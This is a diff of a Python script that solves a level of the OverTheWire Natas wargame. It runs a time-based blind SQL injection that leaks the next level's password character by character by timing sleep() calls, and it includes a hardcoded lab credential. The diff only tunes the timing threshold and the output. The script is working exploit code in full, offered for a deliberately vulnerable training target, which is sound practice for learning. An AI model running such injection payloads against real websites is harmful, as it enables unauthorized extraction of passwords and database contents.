@@ -2,29 +2,33 @@
 
 import requests, sys, urllib.parse, time
 
+threshold = 0.5
 url = "http://natas17.natas.labs.overthewire.org/"
 auth = ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
 
 def check(pos, char):
   start = time.time()
-  username = "\" or if(ascii(substring((select password from users where username=\"natas18\"),{0},1))={1}, sleep(1), sleep(0)) and \"1\"=\"1".format(pos, char)
+  username = "\" or if(ascii(substring((select password from users where username=\"natas18\"),{0},1))={1}, sleep({2}), sleep(0)) and \"1\"=\"1".format(pos, char, threshold)
   requests.get(url, auth=auth, params=[("username", username), ("submit", "Search")])
-  if (time.time() - start) > 1:
+  if (time.time() - start) > threshold:
     return True
   return False
 
 for pos in range(1, 33):
   for char in range(48, 58):
     if check(pos, char):
-      print(chr(char))
+      sys.stdout.write(chr(char))
+      sys.stdout.flush()
       break
 
   for char in range(65, 91):
     if check(pos, char):
-      print(chr(char))
+      sys.stdout.write(chr(char))
+      sys.stdout.flush()
       break
 
   for char in range(97, 123):
     if check(pos, char):
-      print(chr(char))
+      sys.stdout.write(chr(char))
+      sys.stdout.flush()
       break
